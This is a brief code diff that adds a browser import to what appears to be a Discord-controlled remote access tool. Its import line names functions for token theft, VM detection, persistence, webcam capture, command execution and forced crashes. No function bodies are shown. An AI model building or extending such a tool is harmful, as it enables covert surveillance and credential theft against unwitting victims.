@@ -1,5 +1,6 @@
 def main():
     try:
+        import webbrowser
         import discord
         from discord.ext import commands
         from funcs import notify, pwdd, cdd, lsls, exece, screenshots, shutdowns, processkill, reboot, bsodo, gettoken, checkvm, persistence, processlist, enumerator, movef, camgrab, standby
